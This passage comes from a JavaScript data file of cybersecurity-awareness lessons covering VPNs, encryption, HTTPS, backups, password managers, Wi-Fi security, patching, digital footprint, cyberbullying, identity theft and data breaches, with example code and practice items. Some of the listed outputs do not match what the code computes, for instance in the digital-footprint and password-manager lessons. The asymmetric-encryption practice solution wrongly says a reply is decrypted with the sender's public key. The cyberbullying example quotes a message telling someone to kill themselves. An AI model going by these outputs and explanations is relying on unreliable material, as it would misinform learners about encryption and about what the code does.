      isp: 'Only VPN server IP and encrypted data',
      wifiNetwork: 'Only VPN server IP and encrypted data',
      vpnProvider: 'All unencrypted data (depends on no-log policy)',
      internetDestination: vpnServer.ip + ' (not your real IP)'
    }
  };

  return connection;
}

const vpnConnection = connectVPN(
  { ip: '192.168.1.100', location: 'India' },
  { ip: '203.0.113.50', location: 'USA' }
);

console.log('VPN Active:', vpnConnection.whoSeesWhat);`,
    output: '{ isp: "Only VPN server IP and encrypted data", wifiNetwork: "Only VPN server IP and encrypted data", vpnProvider: "All unencrypted data (depends on no-log policy)", internetDestination: "VPN IP (not your real IP)" }',
    notes: [
      'Always verify VPN encryption is active before browsing on public Wi-Fi',
      'Choose VPN providers with published no-log policies and independent audits',
      'VPN slows down your connection slightly—choose servers close to your location for better speed',
      'VPN protects your privacy but doesn\'t make you anonymous—combine with other practices'
    ],
    practice: {
      title: 'Set Up VPN for Remote Work',
      description: 'You need secure access to company files while working remotely from a coffee shop. How would you set up and verify your VPN connection?',
      startCode: '',
      hint: 'Install VPN, connect to company server, verify encryption is active, check your visible IP.',
      solution: 'Steps: (1) Install company VPN or reputable service, (2) Connect to VPN, (3) Verify IP changed via whatismyipaddress.com, (4) Check encryption status, (5) Verify access to company resources'
    }
  },
  {
    id: 'cyber-encryption',
    category: 'Privacy & Encryption',
    title: 'Encryption Basics (Symmetric vs Asymmetric)',
    difficulty: 'Advanced',
    theory: [
      'Encryption converts readable data (plaintext) into unreadable code (ciphertext) using a mathematical algorithm and key, ensuring only authorized parties with the correct key can read it.',
      'Symmetric encryption uses a single key for both encryption and decryption (like AES-256). It\'s fast but requires secure key exchange. Asymmetric encryption uses a public key (shared) and private key (secret).',
      'Asymmetric encryption enables secure communication without pre-shared keys: anyone can encrypt with the public key, but only the private key holder can decrypt. It\'s slower but solves the key exchange problem.',
      'Hybrid approaches combine both: asymmetric encryption for key exchange and symmetric for bulk data encryption, providing security and performance. Modern systems (HTTPS, SSH) use both methods.'
    ],
    syntax: 'Symmetric: encrypt(data, sharedKey) -> ciphertext\nAsymmetric: encrypt(data, publicKey) -> ciphertext | decrypt(ciphertext, privateKey) -> data\nHybrid: asymmetric for key exchange, symmetric for data',
    code: `// Encryption Comparison
function symmetricEncryption(plaintext, sharedKey) {
  // Simplified simulation of AES encryption
  const ciphertext = plaintext
    .split('')
    .map((char, i) => String.fromCharCode(char.charCodeAt(0) ^ sharedKey.charCodeAt(i % sharedKey.length)))
    .join('');

  return {
    method: 'Symmetric (AES-256)',
    plaintext: plaintext,
    ciphertext: ciphertext,
    keyRequired: 'One shared key for both encrypt/decrypt',
    speed: 'Fast',
    challenge: 'Secure key distribution'
  };
}

function asymmetricEncryption(plaintext, publicKey) {
  // Simplified simulation of RSA encryption
  const ciphertext = 'RSA_ENCRYPTED_' + plaintext.length + '_BYTES';

  return {
    method: 'Asymmetric (RSA)',
    plaintext: plaintext,
    ciphertext: ciphertext,
    encryptionKey: 'Public key (shared openly)',
    decryptionKey: 'Private key (kept secret)',
    speed: 'Slower',
    advantage: 'No need to share secret key'
  };
}

function hybridEncryption(plaintext) {
  // Real-world approach: asymmetric for key exchange, symmetric for data
  return {
    method: 'Hybrid (uses both)',
    step1: 'Generate random symmetric session key',
    step2: 'Encrypt session key with asymmetric public key',
    step3: 'Encrypt data with symmetric session key',
    benefit: 'Security of asymmetric + speed of symmetric',
    realWorldExample: 'HTTPS/TLS connections use this approach'
  };
}

console.log('Symmetric:', symmetricEncryption('SecretMessage', 'key123'));
console.log('Asymmetric:', asymmetricEncryption('SecretMessage', 'publicKey123'));
console.log('Hybrid:', hybridEncryption('SecretMessage'));`,
    output: 'Symmetric: fast, requires shared key | Asymmetric: solves key exchange, slower | Hybrid: combines both for optimal security and speed',
    notes: [
      'Use AES-256 for symmetric encryption—it\'s fast and secure',
      'Use RSA-2048 or better for asymmetric encryption',
      'Modern TLS 1.3 uses hybrid encryption for HTTPS connections',
      'Never implement your own encryption—use established libraries like OpenSSL or libsodium'
    ],
    practice: {
      title: 'Explain Encryption in a Scenario',
      description: 'Two friends want to exchange secret messages online without meeting beforehand. Explain how asymmetric encryption enables this.',
      startCode: '',
      hint: 'Consider how they can share public keys without compromising security.',
      solution: 'Friend A shares public key online. Friend B encrypts message with Friend A\'s public key. Friend A decrypts with private key. Friend A shares public key, Friend B decrypts Friend A\'s reply with A\'s public key.'
    }
  },
  {
    id: 'cyber-https-ssl',
    category: 'Privacy & Encryption',
    title: 'HTTPS & SSL/TLS',
    difficulty: 'Intermediate',
    theory: [
      'HTTPS (HTTP Secure) encrypts data in transit between your browser and a website using SSL/TLS protocols. Every modern website should use HTTPS to protect sensitive information like passwords and credit cards.',
      'SSL/TLS uses asymmetric encryption to establish a secure connection and then switches to symmetric encryption for performance. Websites prove their identity through digital certificates issued by trusted Certificate Authorities.',
      'A man-in-the-middle attack intercepts unencrypted HTTP traffic. HTTPS prevents this by encrypting the connection. The lock icon in your browser indicates an active HTTPS connection.',
      'Modern TLS 1.3 is faster and more secure than older versions. Certificates must be valid (not expired) and match the domain name for browsers to trust the connection.'
    ],
    syntax: 'HTTP: Unencrypted, vulnerable to interception\nHTTPS: Encrypted with SSL/TLS, verified with digital certificate\nCertificate: Issued by Certificate Authority, proves domain ownership',
    code: `// HTTPS/TLS Connection Verification
function verifyHTTPSConnection(url) {
  const certificate = {
    domain: 'example.com',
    issuedBy: 'Let\'s Encrypt',
    issuedDate: new Date('2024-01-01'),
    expiryDate: new Date('2025-01-01'),
    algorithm: 'SHA-256 with RSA',
    keySize: 2048
  };

  const now = new Date();
  const isValid = now >= certificate.issuedDate && now <= certificate.expiryDate;
  const domainMatch = url.includes(certificate.domain);

  return {
    url: url,
    protocol: 'HTTPS',
    encryptionStatus: 'TLS 1.3 (256-bit)',
    certificateValid: isValid,
    domainMatch: domainMatch,
    trustStatus: isValid && domainMatch ? 'Trusted' : 'Untrusted',
    warningIcon: !isValid || !domainMatch ? '⚠️' : '🔒',
    recommendation: isValid && domainMatch ? 'Safe to proceed' : 'Do not enter sensitive data'
  };
}

console.log(verifyHTTPSConnection('https://example.com'));`,
    output: '{ protocol: "HTTPS", encryptionStatus: "TLS 1.3 (256-bit)", certificateValid: true, domainMatch: true, trustStatus: "Trusted", warningIcon: "🔒", recommendation: "Safe to proceed" }',
    notes: [
      'Always check for the lock icon before entering passwords or financial information',
      'Be suspicious of HTTPS warnings or "self-signed certificate" messages',
      'Expired certificates indicate the website operator neglected security',
      'HSTS (HTTP Strict Transport Security) forces browsers to use HTTPS for future visits'
    ],
    practice: {
      title: 'Analyze HTTPS Connection',
      description: 'You\'re on a website with a security warning about the certificate. Describe what the warning means and whether you should proceed.',
      startCode: '',
      hint: 'Consider certificate validity, domain mismatch, or self-signed certificates.',
      solution: 'Warnings indicate: (1) Expired cert—site owner neglected renewal, (2) Domain mismatch—possible phishing, (3) Self-signed—untrusted issuer. Do not enter sensitive data.'
    }
  },
  {
    id: 'cyber-backup',
    category: 'Protection Tools',
    title: 'Backup Strategies (3-2-1 Rule)',
    difficulty: 'Beginner',
    theory: [
      'The 3-2-1 backup rule means maintaining 3 copies of important data: 2 on different media types (e.g., hard drive and SSD), and 1 in a geographically separate location (e.g., cloud or offsite).',
      'Regular backups protect against ransomware, hardware failures, accidental deletions, and natural disasters. A backup is useless if you can\'t recover data from it—test restoration regularly.',
      'Backups should be automated and run on schedules (daily for critical data) to ensure consistency without requiring manual intervention. Offline backups prevent ransomware from encrypting backups.',
      'Different data requires different backup frequencies: daily for financial records, weekly for personal files, monthly for archives. Critical business data may need hourly backups.'
    ],
    syntax: '3-2-1 Rule:\n3 copies of your data\n2 different media types\n1 copy offsite (geographically separate)',
    code: `// Backup Strategy Validator
function validate321Backup(backupPlan) {
  const copies = [
    { location: 'Primary computer', media: 'SSD' },
    { location: 'External hard drive', media: 'HDD' },
    { location: 'Cloud storage', media: 'Cloud' }
  ];

  const mediaTypes = new Set(copies.map(c => c.media));
  const offsite = copies.filter(c => c.location === 'Cloud storage');

  const complies = {
    hasCopies: copies.length >= 3,
    differentMedia: mediaTypes.size >= 2,
    hasOffsite: offsite.length >= 1,
    automated: backupPlan.automated === true,
    tested: backupPlan.testedRecovery === true,
    encrypted: backupPlan.encrypted === true
  };

  const compliance = Object.values(complies).filter(Boolean).length;

  return {
    followsRule: complies.hasCopies && complies.differentMedia && complies.hasOffsite,
    complianceScore: compliance + '/6',
    status: compliance === 6 ? 'Excellent protection' : compliance >= 4 ? 'Good protection' : 'Needs improvement',
    recommendations: !complies.automated ? 'Enable automated backups' : ''
  };
}

const backup = {
  automated: true,
  encrypted: true,
  testedRecovery: true
};

console.log(validate321Backup(backup));`,
    output: '{ followsRule: true, complianceScore: "6/6", status: "Excellent protection", recommendations: "" }',
    notes: [
      'Offline backups are immune to ransomware—disconnect after backup completes',
      'Test backup restoration regularly to ensure data integrity',
      'Encrypt backups to protect against theft or unauthorized access',
      'Backup your 2FA recovery codes separately in a secure location'
    ],
    practice: {
      title: 'Design a Backup Plan',
      description: 'Create a backup plan for your laptop following the 3-2-1 rule. Include backup frequency, media types, and recovery testing.',
      startCode: '',
      hint: 'Consider daily/weekly frequency, mix of local and cloud storage, and regular recovery tests.',
      solution: 'Daily encrypted backup to external drive (local), weekly backup to cloud (offsite), monthly full system backup to USB (local), quarterly recovery test'
    }
  },
  {
    id: 'cyber-password-manager',
    category: 'Protection Tools',
    title: 'Password Managers',
    difficulty: 'Beginner',
    theory: [
      'A password manager is a secure vault that stores all your passwords using strong encryption. It allows you to use unique, complex passwords for every account without remembering them.',
      'Password managers generate and fill passwords automatically, protecting against phishing (the real site URL is known) and reducing password reuse attacks.',
      'Popular options include Bitwarden (open-source, affordable), 1Password (user-friendly), and LastPass (feature-rich). All use strong encryption—your passwords are safe even if the company is breached.',
      'The master password is your only password to remember—make it very strong. Password managers sync across devices, making password access convenient while maintaining security.'
    ],
    syntax: 'Password Manager Workflow:\n1. Create master password\n2. Generate strong passwords for each account\n3. Auto-fill passwords when logging in\n4. Access passwords from any device',
    code: `// Password Manager Simulator
function passwordManagerVault(masterPassword) {
  const vault = {
    masterPassword: masterPassword,
    encryptionKey: 'derived-from-' + masterPassword,
    storedPasswords: []
  };

  function addPassword(service, username, password) {
    const encrypted = {
      service: service,
      username: username,
      password: password, // Would be encrypted in real system
      dateAdded: new Date(),
      lastChanged: new Date()
    };
    vault.storedPasswords.push(encrypted);
    return \`Password for \${service} added securely\`;
  }

  function retrievePassword(service) {
    const entry = vault.storedPasswords.find(p => p.service === service);
    return entry ? \`Username: \${entry.username}, Password: ***\` : 'Not found';
  }

  function generatePassword(length = 16) {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*';
    let password = '';
    for (let i = 0; i < length; i++) {
      password += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return password;
  }

  return {
    addPassword,
    retrievePassword,
    generatePassword
  };
}

const pm = passwordManagerVault('MyVeryStrongMasterPassword123!');
console.log(pm.generatePassword(16));
console.log(pm.addPassword('Gmail', 'user@gmail.com', 'generatedPass123!'));`,
    output: 'Generated password: X7k@mPqR9wL2jH5s | Password for Gmail added securely',
    notes: [
      'Create a very strong master password—it\'s the only one protecting all your other passwords',
      'Store master password recovery codes in a secure physical location',
      'Use the password manager\'s password generation feature for all new accounts',
      'Enable two-factor authentication on the password manager itself'
    ],
    practice: {
      title: 'Set Up Password Manager',
      description: 'Choose a password manager (Bitwarden is free) and set it up. Generate passwords for 3 accounts and verify you can retrieve them.',
      startCode: '',
      hint: 'Download the app, create master password, generate and save a few passwords, test auto-fill.',
      solution: 'Successfully installed, created master password, generated and stored 3+ unique passwords for different services'
    }
  },
  {
    id: 'cyber-secure-wifi',
    category: 'Protection Tools',
    title: 'Secure Wi-Fi Setup',
    difficulty: 'Intermediate',
    theory: [
      'A secure Wi-Fi network uses strong encryption (WPA3 or WPA2), complex passwords, and proper access controls to prevent unauthorized network access and data interception.',
      'Weak Wi-Fi security allows nearby attackers to intercept traffic, access shared files, or inject malware into connected devices. Many people never change default router passwords, leaving networks vulnerable.',
      'Modern security standards: WPA3 is best (most secure), WPA2 is acceptable (widely supported), WEP/Open networks are completely insecure. Always disable WPS (Wi-Fi Protected Setup).',
      'Additional measures include disabling WPS, hiding SSID broadcast (security through obscurity—not primary defense), using a strong password, updating firmware, and isolating IoT devices on separate networks.'
    ],
    syntax: 'Wi-Fi Security Settings:\n- Encryption: WPA3 or WPA2\n- Password: 20+ random characters\n- SSID: Optional to hide\n- Disable: WPS, admin access over Wi-Fi\n- Update: Router firmware regularly',
    code: `// Secure Wi-Fi Configuration Validator
function validateWiFiSecurity(wifiConfig) {
  const securityChecks = {
    encryption: wifiConfig.encryption === 'WPA3' || wifiConfig.encryption === 'WPA2',
    passwordStrength: wifiConfig.password.length >= 16,
    hasSpecialChars: /[!@#$%^&*]/.test(wifiConfig.password),
    wpsDisabled: wifiConfig.wpsEnabled === false,
    adminPasswordChanged: wifiConfig.adminPasswordChanged === true,
    firmwareUpdated: wifiConfig.firmwareUpdated === true,
    guestNetworkEnabled: wifiConfig.guestNetworkEnabled === true
  };

  const score = Object.values(securityChecks).filter(Boolean).length;

  return {
    overallSecurity: score >= 6 ? 'Excellent' : score >= 4 ? 'Good' : 'Poor',
    score: score + '/7',
    issues: Object.entries(securityChecks)
      .filter(([_, passed]) => !passed)
      .map(([check, _]) => 'Fix: ' + check),
    recommendations: score < 7 ? 'Address issues above' : 'Network is well-protected'
  };
}

const config = {
  encryption: 'WPA3',
  password: 'K7#mP2@wQ8vL9xR3sT1!bN5cD6',
  wpsEnabled: false,
  adminPasswordChanged: true,
  firmwareUpdated: true,
  guestNetworkEnabled: true
};

console.log(validateWiFiSecurity(config));`,
    output: '{ overallSecurity: "Excellent", score: "7/7", issues: [], recommendations: "Network is well-protected" }',
    notes: [
      'Change the default admin password on your router immediately after setup',
      'Update router firmware regularly through the admin panel or automatic updates',
      'Create a separate guest network for visitors—isolates them from your main network',
      'Disable remote management to prevent attackers from accessing the router interface'
    ],
    practice: {
      title: 'Secure Your Home Wi-Fi',
      description: 'Walk through securing your home Wi-Fi router. Document the current settings and all changes you make.',
      startCode: '',
      hint: 'Access router admin panel (usually 192.168.1.1), update encryption, password, and firmware.',
      solution: 'Enabled WPA3, changed password to 20+ chars, disabled WPS, updated firmware, enabled guest network, changed admin password'
    }
  },
  {
    id: 'cyber-patch-management',
    category: 'Protection Tools',
    title: 'Software Updates & Patching',
    difficulty: 'Intermediate',
    theory: [
      'Software updates and patches fix security vulnerabilities, performance issues, and bugs. Many cyberattacks exploit known vulnerabilities in outdated software—patching is critical defense.',
      'Zero-day vulnerabilities are previously unknown flaws that vendors haven\'t patched yet. Attackers often sell exploits on dark markets. Patching known vulnerabilities eliminates the largest attack surface.',
      'Organizations must balance security (patch immediately) with stability (test before deploying). Large enterprises test patches in staging environments before production deployment.',
      'Automatic updates streamline patching but can introduce issues. Critical security patches should be applied quickly, while feature updates can be scheduled. Always maintain backups before major updates.'
    ],
    syntax: 'Patch Management Strategy:\n- Critical: Apply within 24-48 hours\n- Important: Apply within 1-2 weeks\n- Non-critical: Schedule during maintenance windows\n- Test: Validate in staging before production',
    code: `// Software Update Priority Assessment
function assessUpdatePriority(update) {
  const priorityFactors = {
    isSecurityUpdate: update.type === 'security' ? 2 : 0,
    isOssoftware: update.isOperatingSystem ? 1.5 : 0,
    hasExploit: update.hasKnownExploit ? 2 : 0,
    affectsServices: update.affectsPublicServices ? 1.5 : 0,
    isZeroDay: update.isZeroDay ? 3 : 0
  };

  const urgencyScore = Object.values(priorityFactors).reduce((a, b) => a + b, 0);

  let timeline;
  if (urgencyScore >= 5) timeline = 'IMMEDIATE - within 24 hours';
  else if (urgencyScore >= 3) timeline = 'URGENT - within 48 hours';
  else if (urgencyScore >= 2) timeline = 'HIGH - within 1 week';
  else timeline = 'NORMAL - within 1 month';

  return {
    urgencyScore: urgencyScore,
    timeline: timeline,
    recommendation: \`Apply \${timeline}\`,
    testRequired: urgencyScore < 3 ? 'Yes, test in staging' : 'Yes, test if possible'
  };
}

const criticalUpdate = {
  type: 'security',
  isOperatingSystem: false,
  hasKnownExploit: true,
  isZeroDay: false,
  affectsPublicServices: true
};

console.log(assessUpdatePriority(criticalUpdate));`,
    output: '{ urgencyScore: 5.5, timeline: "IMMEDIATE - within 24 hours", recommendation: "Apply IMMEDIATE - within 24 hours", testRequired: "Yes, test if possible" }',
    notes: [
      'Enable automatic updates for operating systems and browsers—they\'re frequently targeted',
      'Test critical application updates in staging before production',
      'Keep a documented patch schedule and track applied updates',
      'Maintain a previous version backup in case an update causes problems'
    ],
    practice: {
      title: 'Create Patch Management Policy',
      description: 'Design a patch management policy for a company with 100 employees. Include timelines for critical and non-critical patches, testing procedures, and rollback plans.',
      startCode: '',
      hint: 'Consider security criticality, business continuity, testing requirements, and emergency procedures.',
      solution: 'Critical: 24-48 hours with staging test | Important: 2 weeks with testing | Non-critical: Monthly cycle | Rollback plan for each patch'
    }
  },
  {
    id: 'cyber-public-wifi',
    category: 'Online Safety',
    title: 'Public Wi-Fi Risks',
    difficulty: 'Intermediate',
    theory: [
      'Public Wi-Fi at coffee shops, airports, and hotels is convenient but inherently insecure. Attackers can intercept traffic, perform man-in-the-middle attacks, and distribute malware without encryption protection.',
      'On unencrypted networks, attackers can see your passwords, emails, financial transactions, and private messages. They can also impersonate the network, stealing credentials and devices.',
      'VPNs protect public Wi-Fi usage by encrypting all traffic. Additionally, avoid sensitive activities (banking, password changes) on public networks unless using a VPN.',
      'Network spoofing creates fake "coffee shop" networks to trap unwary users. Always verify network names with staff, look for legitimate branding, and use strong passwords for all accounts.'
    ],
    syntax: 'Public Wi-Fi Risks:\n- Man-in-the-middle attacks\n- Packet sniffing\n- Network spoofing\n- Malware distribution\n- SSL stripping (downgrading HTTPS)',
    code: `// Public Wi-Fi Risk Assessment
function assessPublicWiFiRisk(activity, hasVPN) {
  const activityRisks = {
    emailCheck: { risk: 'medium', encrypted: false },
    banking: { risk: 'critical', encrypted: false },
    socialMedia: { risk: 'low', encrypted: true }, // usually HTTPS
    passwordChange: { risk: 'critical', encrypted: false },
    documentSharing: { risk: 'high', encrypted: false },
    browsingNews: { risk: 'low', encrypted: true }
  };

  const baseRisk = activityRisks[activity];

  if (!baseRisk) return { error: 'Unknown activity' };

  // VPN reduces all risks significantly
  const adjustedRisk = hasVPN ? 'minimal' : baseRisk.risk;

  return {
    activity: activity,
    baseRisk: baseRisk.risk,
    withVPN: adjustedRisk,
    usesHTTPS: baseRisk.encrypted,
    recommendation: adjustedRisk === 'critical' ? 'AVOID or use VPN' :
                   adjustedRisk === 'high' ? 'Use VPN recommended' :
                   adjustedRisk === 'medium' ? 'Use VPN if possible' : 'Generally safe'
  };
}

console.log('Banking without VPN:', assessPublicWiFiRisk('banking', false));
console.log('Banking with VPN:', assessPublicWiFiRisk('banking', true));`,
    output: 'Banking without VPN: { risk: "critical", recommendation: "AVOID or use VPN" } | Banking with VPN: { risk: "minimal", recommendation: "Safe with VPN" }',
    notes: [
      'Always use a VPN on public Wi-Fi before connecting',
      'Avoid sensitive transactions (banking, password changes) on public networks',
      'Verify network names with staff—attackers create fake networks',
      'Disable auto-connect features that join known networks automatically'
    ],
    practice: {
      title: 'Secure Public Wi-Fi Workflow',
      description: 'You\'re at an airport and need to check your bank account and access work files. Design a secure workflow using available tools.',
      startCode: '',
      hint: 'Consider VPN, HTTPS, and what activities are safe.',
      solution: 'Steps: (1) Connect to VPN before opening browser, (2) Verify HTTPS when accessing bank, (3) Use VPN for all activities, (4) Avoid password changes, (5) Don\'t trust network unless verified'
    }
  },
  {
    id: 'cyber-digital-footprint',
    category: 'Online Safety',
    title: 'Digital Footprint',
    difficulty: 'Beginner',
    theory: [
      'Your digital footprint is all the information about you available online: social media posts, photos, comments, websites you\'ve visited, and data collected by companies. It\'s largely permanent and searchable.',
      'A large public digital footprint enables identity theft, social engineering, stalking, and embarrassment from past posts. Personal information posted years ago may resurface to harm your reputation.',
      'Reducing your digital footprint involves limiting what you share, adjusting privacy settings, requesting data deletion from websites, and being mindful of information shared with apps and services.',
      'You can\'t eliminate your digital footprint entirely, but you can control what\'s visible and minimize what\'s collected. Regular searches for your name reveal what\'s public and enable targeted cleanup.'
    ],
    syntax: 'Digital Footprint Components:\n- Social media posts and likes\n- Photos and location data\n- Search history\n- Cookies and tracking\n- Company data collection',
    code: `// Digital Footprint Assessment
function assessDigitalFootprint(userData) {
  const exposure = {
    socialMediaPosts: userData.socialPosts || 0,
    publicPhotos: userData.publicPhotos || 0,
    locationHistory: userData.locationTracking ? 'enabled' : 'disabled',
    dataBrokers: userData.databrokerListings || 0,
    searchableContent: userData.indexedBySearch || false,
    dataCollectors: userData.trackedByCompanies || []
  };

  const footprintSize =
    exposure.socialMediaPosts * 5 +
    exposure.publicPhotos * 10 +
    (exposure.searchableContent ? 20 : 0) +
    exposure.dataBrokers * 15;

  return {
    footprintSize: footprintSize,
    riskLevel: footprintSize > 100 ? 'High exposure' : footprintSize > 50 ? 'Moderate' : 'Low exposure',
    privacyScore: Math.max(0, 100 - footprintSize),
    recommendations: [
      exposure.socialMediaPosts > 500 ? 'Review and delete old posts' : null,
      exposure.locationTracking ? 'Disable location tracking' : null,
      exposure.searchableContent ? 'Request removal from search engines' : null,
      exposure.dataBrokers > 5 ? 'Request data deletion from brokers' : null
    ].filter(Boolean)
  };
}

const profile = {
  socialPosts: 200,
  publicPhotos: 50,
  locationTracking: true,
  indexedBySearch: true,
  databrokerListings: 8
};

console.log(assessDigitalFootprint(profile));`,
    output: '{ footprintSize: 220, riskLevel: "High exposure", privacyScore: -120, recommendations: ["Disable location tracking", "Request removal from search engines", "Request data deletion from brokers"] }',
    notes: [
      'Search your name regularly on Google and Bing to see what\'s publicly visible',
      'Adjust privacy settings on social media to limit who sees your posts',
      'Use data removal services to request deletion from data brokers',
      'Before posting, consider if you\'ll be comfortable with this content in 10 years'
    ],
    practice: {
      title: 'Audit Your Digital Footprint',
      description: 'Search your name on Google and identify what\'s publicly visible. Create a plan to reduce unwanted exposure.',
      startCode: '',
      hint: 'Check multiple sources: Google, social media, data brokers (BeenVerified, Spokeo).',
      solution: 'Identified: X posts publicly visible | Y personal details exposed | Created plan: Delete old posts, adjust privacy, request broker removal'
    }
  },
  {
    id: 'cyber-cyberbullying',
    category: 'Online Safety',
    title: 'Cyberbullying Awareness',
    difficulty: 'Beginner',
    theory: [
      'Cyberbullying is harassment, humiliation, or threats conducted online through social media, messaging apps, email, or other digital channels. It\'s a serious issue affecting emotional health and safety.',
      'Cyberbullying escalates harassment because it\'s permanent (digital records), reaches a wide audience, involves anonymity (emboldens bullies), and follows victims home (no escape).',
      'Common forms include spreading rumors, sharing embarrassing photos/videos, exclusion, impersonation, and threats. It affects people of all ages but is especially harmful to young people.',
      'Prevention involves setting privacy boundaries, thinking before posting, supporting targets, and reporting abusive content. Platforms have reporting tools and should remove violations—hold them accountable.'
    ],
    syntax: 'Cyberbullying Red Flags:\n- Repeated hostile messages\n- Spreading rumors or false information\n- Sharing private/embarrassing content without consent\n- Threats of violence\n- Impersonation',
    code: `// Cyberbullying Detection and Response
function detectCyberbullying(message, context) {
  const redFlags = {
    hasThreats: /kill|hurt|harm|attack|beat up/i.test(message),
    hasInsults: /stupid|ugly|loser|worthless|idiot/i.test(message),
    sharesPrivateContent: context.sharesPrivateInfo === true,
    repeated: context.isRepeated === true,
    isPublic: context.isPublic === true,
    isImpersonation: context.isImpersonation === true
  };

  const severityScore = Object.values(redFlags).filter(Boolean).length;

  return {
    isCyberbullying: severityScore >= 2,
    severityScore: severityScore,
    redFlags: redFlags,
    actions: {
      documentation: 'Screenshot and save evidence',
      reporting: 'Report to platform immediately',
      blocking: 'Block the bully',
      support: 'Talk to trusted adult or counselor',
      legal: severityScore >= 4 ? 'Consider involving law enforcement' : null
    }
  };
}

const bullying = {
  message: 'Everyone hates you, you should kill yourself',
  sharesPrivateInfo: true,
  isRepeated: true,
  isPublic: true
};

console.log(detectCyberbullying(bullying.message, bullying));`,
    output: '{ isCyberbullying: true, severityScore: 4, actions: { documentation: "Save evidence", reporting: "Report to platform", blocking: "Block immediately", support: "Contact counselor", legal: "Consider law enforcement" } }',
    notes: [
      'Document cyberbullying with screenshots and dates before evidence disappears',
      'Block bullies on all platforms and don\'t engage with their messages',
      'Tell a trusted adult, counselor, or law enforcement if threats are serious',
      'Support targets by not sharing harmful content and showing kindness online'
    ],
    practice: {
      title: 'Respond to Cyberbullying',
      description: 'You witness cyberbullying on social media. Describe how you would respond to help the victim while not escalating the situation.',
      startCode: '',
      hint: 'Consider documenting, supporting the victim, reporting, and not engaging with the bully.',
      solution: 'Actions: (1) Document with screenshots, (2) Send supportive message to victim, (3) Report to platform, (4) Block the bully, (5) Encourage victim to tell trusted adult'
    }
  },
  {
    id: 'cyber-identity-theft',
    category: 'Online Safety',
    title: 'Identity Theft',
    difficulty: 'Intermediate',
    theory: [
      'Identity theft occurs when someone steals your personal information (name, SSN, passport number, financial data) and uses it fraudulently to open accounts, make purchases, or commit crimes in your name.',
      'Identity thieves use stolen information for credit fraud (opening credit cards), financial fraud (accessing bank accounts), criminal identity theft (committing crimes in your name), and medical fraud.',
      'Prevention includes monitoring credit reports, securing sensitive documents, using strong passwords, shredding personal papers, and avoiding public Wi-Fi for sensitive activities.',
      'If you suspect identity theft, immediately freeze your credit, dispute fraudulent charges, file a police report, and notify affected institutions. Credit freezes prevent thieves from opening new accounts.'
    ],
    syntax: 'Identity Theft Prevention:\n- Monitor credit reports (Annual free reports)\n- Freeze credit with bureaus (Equifax, Experian, TransUnion)\n- Strong, unique passwords\n- Secure documents physically\n- Verify financial accounts regularly',
    code: `// Identity Theft Risk Assessment
function assessIdentityTheftRisk(personalDataExposure) {
  const riskFactors = {
    hasSSN: personalDataExposure.ssnExposed ? 3 : 0,
    hasPassport: personalDataExposure.passportExposed ? 2 : 0,
    hasFinancialInfo: personalDataExposure.bankInfoExposed ? 3 : 0,
    hasMediator: personalDataExposure.inDataBreach ? 2 : 0,
    weakPassword: personalDataExposure.weakPassword ? 1 : 0,
    noCreditFreeze: personalDataExposure.creditFrozen ? 0 : 2
  };

  const riskScore = Object.values(riskFactors).reduce((a, b) => a + b, 0);

  return {
    riskScore: riskScore,
    riskLevel: riskScore > 8 ? 'Critical' : riskScore > 5 ? 'High' : riskScore > 2 ? 'Moderate' : 'Low',
    immediateActions: [
      'Monitor credit reports',
      'Freeze credit if needed',
      'Enable fraud alerts',
      'Change passwords'
    ],
    longTermActions: [
      'Credit monitoring service',
      'Identity theft insurance',
      'Secure document storage'
    ]
  };
}

const exposure = {
  ssnExposed: false,
  bankInfoExposed: true,
  inDataBreach: true,
  creditFrozen: false
};

console.log(assessIdentityTheftRisk(exposure));`,
    output: '{ riskScore: 7, riskLevel: "High", immediateActions: [...], longTermActions: [...] }',
    notes: [
      'You\'re entitled to free credit reports annually from AnnualCreditReport.com',
      'Freeze your credit with all three bureaus for maximum protection',
      'Consider identity theft insurance for coverage and professional recovery help',
      'Monitor your children\'s information separately—they\'re targets for long-term fraud'
    ],
    practice: {
      title: 'Create Identity Theft Response Plan',
      description: 'Develop a response plan for identity theft discovery. Include immediate steps, agency notifications, and documentation requirements.',
      startCode: '',
      hint: 'Consider credit bureaus, financial institutions, police, and documentation.',
      solution: 'Immediate: Freeze credit, dispute charges, contact banks | Notify: Credit bureaus, financial institutions, Social Security, police | Document: Timeline, evidence, communications'
    }
  },
  {
    id: 'cyber-data-breach',
    category: 'Threats & Attacks',
    title: 'Data Breaches',
    difficulty: 'Intermediate',
    theory: [
      'A data breach is unauthorized access to sensitive information—customer data, passwords, financial records, or intellectual property. Breaches result from hacking, malware, insider threats, or misconfiguration.',
      'Major breaches expose millions of records and cause financial loss, reputational damage, and regulatory fines under GDPR and other laws. Affected individuals face identity theft and fraud risks.',
      'Companies must detect breaches quickly, notify affected parties, investigate root causes, and improve security. Delay increases harm and legal liability.',
      'After a breach, affected individuals should monitor credit reports, watch for fraudulent activity, enable fraud alerts, and consider identity theft protection services.'
    ],
    syntax: 'Data Breach Response:\n1. Detect breach\n2. Contain damage\n3. Notify authorities and affected users\n4. Investigate root cause\n5. Implement fixes\n6. Notify credit bureaus',
    code: `// Data Breach Impact Assessment
function assessDataBreachImpact(breachData) {
  const impact = {
    recordsExposed: breachData.recordsExposed,
    dataTypes: breachData.dataTypes, // passwords, SSN, credit cards, etc.
    externalExposure: breachData.wasPostedOnline ? true : false,
    monetaryDamage: breachData.recordsExposed * 200, // avg cost per record
    regulatoryFines: breachData.recordsExposed * 10, // GDPR: up to 4% revenue
    reputationalDamage: breachData.recordsExposed > 1000000 ? 'Severe' : 'Moderate'
  };

  const severityFactors = [
    breachData.dataTypes.includes('credit_card') ? 'Critical' : null,
    breachData.dataTypes.includes('ssn') ? 'Critical' : null,
    breachData.dataTypes.includes('password') ? 'High' : null,
    breachData.externalExposure ? 'Increased severity' : null
  ].filter(Boolean);

  return {
    severityLevel: severityFactors[0] || 'High',
    estimatedCost: \`$\${impact.monetaryDamage + impact.regulatoryFines}\`,
    affectedUsers: impact.recordsExposed,
    responsePriority: 'IMMEDIATE - Begin incident response',
    notificationsRequired: [
      'Affected users',
      'Regulatory authorities',
      'Credit bureaus (if financial data)',
      'Law enforcement (if criminal)'
    ]
  };
}

const breach = {
  recordsExposed: 500000,
  dataTypes: ['email', 'password', 'credit_card'],
  wasPostedOnline: true
};

console.log(assessDataBreachImpact(breach));`,
